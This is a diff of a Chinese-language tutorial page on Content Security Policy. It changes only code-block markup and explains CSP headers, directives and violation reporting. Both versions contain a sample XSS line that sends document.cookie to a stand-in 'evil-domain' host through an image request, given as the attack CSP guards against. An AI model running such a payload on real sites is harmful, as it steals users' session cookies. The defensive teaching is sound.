@@ -81,22 +81,27 @@ Content Security Policy (CSP) is an added layer of security that helps to detect
 <li><p>通过 HTML 文档的 meta 标签配置策略</p>
 <p>例如：</p>
 <p>使用 HTTP 头部，这里的 policy 为策略字符串</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: policy</span><br></pre></td></tr></table></figure>
-</li>
+<pre><code>Content-Security-Policy: policy
+</code></pre></li>
 </ul>
 <p>使用 HTML meta 标签的方式</p>
- <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; img-src https://*; child-src 'none';"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="HTML">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#39;self&#39;; img-src https://*; child-src &#39;none&#39;;&quot;&gt;
+</code></pre>
 <h2 id="主要防范目标"><a href="#主要防范目标" class="headerlink" title="主要防范目标"></a>主要防范目标</h2><p> CSP主要是防范 XSS 攻击，以及报告 XSS 攻击，如果页面存在漏洞让 JS 脚本注入，CSP 能限制脚本的运行，然后把损失降到最小</p>
- <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> Image()).src = <span class="string">"http://www.evil-domain.com/steal-cookie.php?cookie="</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>
+<pre><code class="Javascript"> (new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;
+
+</code></pre>
 <p> CSP 是通过限制加载到页面上的资源、域或者协议来实现的，例如，一旦入侵者找到漏洞注入了XSS攻击，入侵者可以通过 图片Ping的方式发送敏感信息到外部网站。CSP 可以指定允许信任域名下的图片、Script和样式表被加载到页面上，及时入侵者 XSS 入侵成功也无法通过这些方式发送数据，保证网站一定程度上安全。</p>
 <p> TODO 几个例子限制加载的资源</p>
 <p>另外 CSP 也提供了只允许加载指定协议，例如HTTPS的资源，否则自动跳转到 HTTPS 版本。</p>
 <h2 id="使用-CSP"><a href="#使用-CSP" class="headerlink" title="使用 CSP"></a>使用 CSP</h2><p>当我们需要使用CSP生效就需要编写相应的策略，策略包括一系列指令组成和设置定的值组成。</p>
 <p>例如，一个网站管理者允许内容来自信任的域名及其子域名 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos; *.trusted.com</span><br></pre></td></tr></table></figure>
-<p>我们再看一条策略：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com</span><br></pre></td></tr></table></figure>
-<p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39; *.trusted.com
+
+</code></pre><p>我们再看一条策略：</p>
+<pre><code>Content-Security-Policy: default-src &#39;self&#39;; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
+
+</code></pre><p>这条策略有4个指令 img-src 为图片资源，media-src 为视频媒体资源，script-src 为脚本资源。最重要的一个是 default-src 为所有的资源默认属性，这里设置为了 ‘self’ 的含义为所有的资源再不指定的情况下只能从自身域下加载。</p>
 <p>TODO 描述 行内脚本</p>
 <h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p><host-source></host-source></p>
 <p><scheme-source><br>    self<br>    unsafe-inline<br>    unsafe-eva<br>    none<br>    nonce-&lt;base64值&gt;<br>    strict-dynamic</scheme-source></p>
@@ -104,10 +109,24 @@ Content Security Policy (CSP) is an added layer of security that helps to detect
 <p> TODO 讲解这几种模式</p>
 <h2 id="报告违规情况"><a href="#报告违规情况" class="headerlink" title="报告违规情况"></a>报告违规情况</h2><p>CSP 提供了另外一个非常有用的模式 - 报告模式，如果在 HTTP 头部指定 Content-Security-Policy-Report-Only 可以将发生了任何违规的事件都会被报告出去，但是这个头部只会对报告生效，实际生效还是需要 在Content-Security-Policy 中指定。</p>
 <p>在报告的策略中需要配置一个 report-uri 用于服务器接受违规报告情况，例如：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Content-Security-Policy: default-src &apos;self&apos;; report-uri http://reportcollector.example.com/collector.cgi</span><br></pre></td></tr></table></figure>
-<p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p>
+<pre><code>
+Content-Security-Policy: default-src &#39;self&#39;; report-uri http://reportcollector.example.com/collector.cgi
+
+
+</code></pre><p>浏览器会向 report-uri 中指定的地址使用 POST 发送一个 JSON 格式的数据包。</p>
 <p>数据包格式如下：</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">"csp-report"</span>: &#123;</span><br><span class="line">    <span class="attr">"document-uri"</span>: <span class="string">"http://example.com/signup.html"</span>,</span><br><span class="line">    <span class="attr">"referrer"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"blocked-uri"</span>: <span class="string">"http://example.com/css/style.css"</span>,</span><br><span class="line">    <span class="attr">"violated-directive"</span>: <span class="string">"style-src cdn.example.com"</span>,</span><br><span class="line">    <span class="attr">"original-policy"</span>: <span class="string">"default-src 'none'; style-src cdn.example.com; report-uri /_/csp-reports"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="JSON">
+{
+  &quot;csp-report&quot;: {
+    &quot;document-uri&quot;: &quot;http://example.com/signup.html&quot;,
+    &quot;referrer&quot;: &quot;&quot;,
+    &quot;blocked-uri&quot;: &quot;http://example.com/css/style.css&quot;,
+    &quot;violated-directive&quot;: &quot;style-src cdn.example.com&quot;,
+    &quot;original-policy&quot;: &quot;default-src &#39;none&#39;; style-src cdn.example.com; report-uri /_/csp-reports&quot;
+  }
+}
+
+</code></pre>
 	  
 
 	  <div>
@@ -223,15 +242,15 @@ Content Security Policy (CSP) is an added layer of security that helps to detect
 		
 	
 		
-	
-		
 			
 		
 	
 		
-			
+	
 		
 	
+		
+			
 		
 	
 		
